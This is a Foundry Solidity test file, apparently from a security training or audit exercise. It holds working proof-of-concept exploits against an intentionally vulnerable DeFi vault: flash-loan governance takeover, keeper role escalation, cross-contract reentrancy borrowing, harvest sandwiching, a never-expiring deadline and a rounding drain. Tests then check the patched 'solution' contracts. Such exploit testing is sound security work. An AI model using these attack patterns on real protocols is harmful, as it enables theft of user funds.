// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20, IStrategy, ICredit, ITokenReceiver} from "../src/Interfaces.sol";
import {SimpleToken, HookToken} from "../src/Tokens.sol";
import {GuardGovernor} from "../src/GuardGovernor.sol";
import {StrategyManager} from "../src/StrategyManager.sol";
import {GuardVault} from "../src/GuardVault.sol";
import {GuardCredit} from "../src/GuardCredit.sol";
import {MiniSwap} from "../src/MiniSwap.sol";
import {YieldStrategy} from "../src/YieldStrategy.sol";
import {
    GuardTokenFixed, GuardGovernorFixed, StrategyManagerFixed, GuardVaultFixed,
    GuardCreditFixed, YieldStrategyFixed, IStrategyFixed
} from "../solution/GuardVaultFixed.sol";

contract EvilStrategy is IStrategy {
    IERC20 asset;
    address thief;

    constructor(IERC20 a, address t) {
        asset = a;
        thief = t;
    }

    function totalAssets() external pure returns (uint256) {
        return 0;
    }

    function deployFunds(uint256) external {
        asset.transfer(thief, asset.balanceOf(address(this)));
    }

    function freeFunds(uint256) external {}

    function harvest() external pure returns (uint256) {
        return 0;
    }
}

contract FlashLender {
    function flash(IERC20 token, uint256 amount, address receiver, bytes calldata data) external {
        uint256 before = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        (bool ok, ) = receiver.call(data);
        require(ok, "callback failed");
        require(token.balanceOf(address(this)) >= before, "not repaid");
    }
}

contract GovAttacker {
    function run(FlashLender lender, IERC20 guard, GuardGovernor gov, address[] calldata t, bytes[] calldata p, uint256 amount)
        external
    {
        lender.flash(guard, amount, address(this), abi.encodeCall(this.onFlash, (lender, guard, gov, t, p, amount)));
    }

    function onFlash(FlashLender lender, IERC20 guard, GuardGovernor gov, address[] calldata t, bytes[] calldata p, uint256 amount)
        external
    {
        uint256 id = gov.propose(t, p);
        gov.vote(id);
        gov.execute(id);
        guard.transfer(address(lender), amount);
    }
}

contract ReentrantBorrower is ITokenReceiver {
    GuardVault vault;
    GuardCredit credit;
    IERC20 asset;
    bool armed;

    constructor(GuardVault v, GuardCredit c, IERC20 a) {
        vault = v;
        credit = c;
        asset = a;
    }

    function enter(uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.deposit(amount, address(this));
    }

    function attack() external {
        armed = true;
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
    }

    function onTokenReceived(address, uint256) external {
        if (!armed) return;
        armed = false;
        credit.borrow(credit.maxBorrow(address(this)));
    }
}

contract GuardBase is Test {
    uint256 constant E = 1e18;
    HookToken asset = new HookToken("Asset");
    SimpleToken reward = new SimpleToken("Reward");
    address alice = makeAddr("alice");
    address keeper = makeAddr("keeper");
    address attacker = makeAddr("attacker");
}

contract GuardVaultPoC is GuardBase {
    SimpleToken guard = new SimpleToken("Guard");
    GuardGovernor gov = new GuardGovernor(IERC20(address(guard)));
    StrategyManager manager = new StrategyManager(address(this));
    GuardVault vault = new GuardVault(IERC20(address(asset)), manager);
    GuardCredit credit = new GuardCredit(vault, IERC20(address(asset)));
    MiniSwap pool = new MiniSwap(IERC20(address(reward)), IERC20(address(asset)));
    YieldStrategy strat;

    function setUp() public {
        vault.setCredit(credit);
        manager.setVault(vault);
        manager.grantRole(manager.ADMIN_ROLE(), address(gov));
        manager.grantRole(manager.KEEPER_ROLE(), keeper);
        strat = new YieldStrategy(
            IERC20(address(asset)), IERC20(address(reward)), vault, address(manager), pool
        );
        manager.addStrategy(strat);

        reward.mint(address(this), 100_000 * E);
        asset.mint(address(this), 100_000 * E);
        reward.approve(address(pool), type(uint256).max);
        asset.approve(address(pool), type(uint256).max);
        pool.addLiquidity(100_000 * E, 100_000 * E);

        asset.mint(alice, 100_000 * E);
        vm.startPrank(alice);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100_000 * E, alice);
        vm.stopPrank();

        asset.mint(address(credit), 50_000 * E);
    }

    /// GV-DFI-5 (Critical): voting power comes from the current balance, with no delay.
    function test_GV_DFI_5_flashGovernance() public {
        FlashLender lender = new FlashLender();
        guard.mint(address(lender), 400_000 * E);
        guard.mint(alice, 600_000 * E);

        EvilStrategy evil = new EvilStrategy(IERC20(address(asset)), attacker);
        address[] memory targets = new address[](2);
        bytes[] memory payloads = new bytes[](2);
        targets[0] = address(manager);
        payloads[0] = abi.encodeCall(StrategyManager.addStrategy, (evil));
        targets[1] = address(manager);
        payloads[1] = abi.encodeCall(StrategyManager.allocate, (evil, 100_000 * E));

        GovAttacker bot = new GovAttacker();
        bot.run(lender, IERC20(address(guard)), gov, targets, payloads, 400_000 * E);

        assertEq(asset.balanceOf(attacker), 100_000 * E);
        assertEq(guard.balanceOf(address(bot)), 0, "bot owns no governance tokens afterwards");
    }

    /// GV-ACC-7 (High): the keeper grants itself the strategist role and drains the vault.
    function test_GV_ACC_7_keeperEscalation() public {
        EvilStrategy evil = new EvilStrategy(IERC20(address(asset)), attacker);
        bytes32 strategist = manager.STRATEGIST_ROLE();

        vm.prank(keeper);
        vm.expectRevert("missing role");
        manager.addStrategy(evil);

        vm.startPrank(keeper);
        manager.grantRole(strategist, keeper);
        manager.addStrategy(evil);
        manager.allocate(evil, 100_000 * E);
        vm.stopPrank();

        assertEq(asset.balanceOf(attacker), 100_000 * E);
    }

    /// GV-REN-2 (High): the transfer hook runs before the burn; the credit contract sees stale shares.
    function test_GV_REN_2_crossContractReentrancy() public {
        ReentrantBorrower bot = new ReentrantBorrower(vault, credit, IERC20(address(asset)));
        asset.mint(address(bot), 10_000 * E);
        bot.enter(10_000 * E);

        bot.attack();

        emit log_named_decimal_uint("attacker assets", asset.balanceOf(address(bot)), 18);
        emit log_named_decimal_uint("unbacked debt", credit.debtOf(address(bot)), 18);
        assertEq(vault.balanceOf(address(bot)), 0, "no collateral remains");
        assertGt(credit.debtOf(address(bot)), 0, "debt remains");
        assertGt(asset.balanceOf(address(bot)), 10_000 * E, "attacker exits with more than it deposited");
    }

    function _allocateAndSeedReward(uint256 rewardAmount) internal {
        manager.allocate(strat, 100_000 * E);
        reward.mint(address(strat), rewardAmount);
    }

    /// GV-MEV-2 (High): harvest sells with a zero minimum output, so it can be sandwiched.
    function test_GV_MEV_2_harvestSandwich() public {
        _allocateAndSeedReward(10_000 * E);
        uint256 snap = vm.snapshotState();

        vm.prank(keeper);
        uint256 fairGain = manager.harvest(strat);
        vm.revertToState(snap);

        reward.mint(attacker, 50_000 * E);
        vm.startPrank(attacker);
        reward.approve(address(pool), type(uint256).max);
        asset.approve(address(pool), type(uint256).max);
        uint256 got = pool.swap(address(reward), 50_000 * E, 0, block.timestamp);
        vm.stopPrank();

        vm.prank(keeper);
        uint256 sandwichedGain = manager.harvest(strat);

        vm.prank(attacker);
        pool.swap(address(asset), got, 0, block.timestamp);

        emit log_named_decimal_uint("harvest without attack", fairGain, 18);
        emit log_named_decimal_uint("harvest when sandwiched", sandwichedGain, 18);
        emit log_named_decimal_uint("attacker reward balance", reward.balanceOf(attacker), 18);
        assertLt(sandwichedGain, fairGain);
        assertGt(reward.balanceOf(attacker), 50_000 * E, "attacker gains reward tokens");
    }

    /// GV-MEV-1 (Medium): deadline = block.timestamp can never expire.
    function test_GV_MEV_1_timestampDeadlineNeverExpires() public {
        _allocateAndSeedReward(10_000 * E);
        uint256 snap = vm.snapshotState();

        vm.prank(keeper);
        uint256 expected = manager.harvest(strat);
        vm.revertToState(snap);

        reward.mint(address(this), 80_000 * E);
        pool.swap(address(reward), 80_000 * E, 0, block.timestamp);
        vm.warp(block.timestamp + 30 days);

        vm.prank(keeper);
        uint256 late = manager.harvest(strat);

        emit log_named_decimal_uint("expected at signing", expected, 18);
        emit log_named_decimal_uint("executed after 30 days", late, 18);
        assertLt(late, expected);
    }

    /// GV-ARI-2 (Medium): previewWithdraw and previewMint round down, in favor of the user.
    function test_GV_ARI_2_rounding() public {
        _allocateAndSeedReward(10_000 * E);
        vm.prank(keeper);
        manager.harvest(strat);
        assertGt(vault.totalAssets(), vault.totalSupply(), "share price is above 1");

        assertEq(vault.balanceOf(attacker), 0);
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 1_000; i++) {
            assertEq(vault.withdraw(1, attacker, attacker), 0, "burns zero shares");
        }
        vm.stopPrank();
        assertEq(asset.balanceOf(attacker), 1_000, "1,000 wei for no shares");

        assertEq(vault.previewMint(1), 1, "true cost is above 1 wei, floor returns 1");
    }
}

contract GuardVaultFixTest is GuardBase {
    GuardTokenFixed guard = new GuardTokenFixed("Guard");
    GuardGovernorFixed gov = new GuardGovernorFixed(guard);
    StrategyManagerFixed manager = new StrategyManagerFixed(address(this));
    GuardVaultFixed vault = new GuardVaultFixed(IERC20(address(asset)), manager);
    GuardCreditFixed credit = new GuardCreditFixed(vault, IERC20(address(asset)));
    MiniSwap pool = new MiniSwap(IERC20(address(reward)), IERC20(address(asset)));
    YieldStrategyFixed strat;

    function setUp() public {
        vault.setCredit(credit);
        manager.setVault(vault);
        manager.grantRole(manager.ADMIN_ROLE(), address(gov));
        manager.grantRole(manager.KEEPER_ROLE(), keeper);
        manager.grantRole(manager.STRATEGIST_ROLE(), address(this));
        strat = new YieldStrategyFixed(
            IERC20(address(asset)), IERC20(address(reward)), vault, address(manager), pool
        );
        manager.addStrategy(strat);

        reward.mint(address(this), 100_000 * E);
        asset.mint(address(this), 100_000 * E);
        reward.approve(address(pool), type(uint256).max);
        asset.approve(address(pool), type(uint256).max);
        pool.addLiquidity(100_000 * E, 100_000 * E);

        asset.mint(alice, 100_000 * E);
        vm.startPrank(alice);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100_000 * E, alice);
        vm.stopPrank();
        asset.mint(address(credit), 50_000 * E);
    }

    function test_fix_flashVoteHasNoWeight() public {
        vm.roll(100);
        guard.mintFixed(alice, 600_000 * E);
        vm.roll(101);

        address[] memory t = new address[](1);
        bytes[] memory p = new bytes[](1);
        t[0] = address(manager);
        p[0] = abi.encodeCall(StrategyManagerFixed.grantRole, (manager.KEEPER_ROLE(), attacker));
        uint256 id = gov.propose(t, p);

        // Tokens received after the snapshot carry no weight.
        vm.prank(alice);
        guard.transfer(attacker, 400_000 * E);
        vm.startPrank(attacker);
        gov.vote(id);
        vm.expectRevert("delay active");
        gov.execute(id);
        vm.stopPrank();

        vm.warp(block.timestamp + 3 days);
        vm.expectRevert("quorum not met");
        gov.execute(id);
    }

    function test_fix_legitimateVoterStillWorks() public {
        vm.roll(100);
        guard.mintFixed(alice, 600_000 * E);
        vm.roll(101);
        address[] memory t = new address[](1);
        bytes[] memory p = new bytes[](1);
        t[0] = address(manager);
        p[0] = abi.encodeCall(StrategyManagerFixed.grantRole, (manager.KEEPER_ROLE(), attacker));
        uint256 id = gov.propose(t, p);
        vm.prank(alice);
        gov.vote(id);
        vm.warp(block.timestamp + 3 days);
        gov.execute(id);
        assertTrue(manager.hasRole(manager.KEEPER_ROLE(), attacker));
    }

    function test_fix_keeperCannotEscalate() public {
        bytes32 role = manager.STRATEGIST_ROLE();
        vm.prank(keeper);
        vm.expectRevert("missing role");
        manager.grantRole(role, keeper);
    }

    function test_fix_withdrawBlocksHookBorrow() public {
        FixedBorrower bot = new FixedBorrower(vault, credit, IERC20(address(asset)));
        asset.mint(address(bot), 10_000 * E);
        bot.enter(10_000 * E);
        vm.expectRevert("vault busy");
        bot.attack();
    }

    function test_fix_harvestEnforcesLimits() public {
        manager.allocate(strat, 100_000 * E);
        reward.mint(address(strat), 10_000 * E);
        vm.startPrank(keeper);
        vm.expectRevert("slippage");
        manager.harvest(strat, 9_500 * E, block.timestamp + 1 hours);

        uint256 deadline = block.timestamp + 1 hours;
        vm.warp(block.timestamp + 2 hours);
        vm.expectRevert("expired");
        manager.harvest(strat, 9_000 * E, deadline);

        manager.harvest(strat, 9_000 * E, block.timestamp + 1 hours);
        vm.stopPrank();
    }

    function test_fix_roundingFavorsVault() public {
        manager.allocate(strat, 100_000 * E);
        reward.mint(address(strat), 10_000 * E);
        vm.prank(keeper);
        manager.harvest(strat, 0, block.timestamp);

        assertEq(vault.previewWithdraw(1), 1);
        assertEq(vault.previewMint(1), 2);
        vm.prank(attacker);
        vm.expectRevert();
        vault.withdraw(1, attacker, attacker);
    }
}

contract FixedBorrower is ITokenReceiver {
    GuardVaultFixed vault;
    GuardCreditFixed credit;
    IERC20 asset;
    bool armed;

    constructor(GuardVaultFixed v, GuardCreditFixed c, IERC20 a) {
        vault = v;
        credit = c;
        asset = a;
    }

    function enter(uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.deposit(amount, address(this));
    }

    function attack() external {
        armed = true;
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
    }

    function onTokenReceived(address, uint256) external {
        if (!armed) return;
        armed = false;
        credit.borrow(1);
    }
}
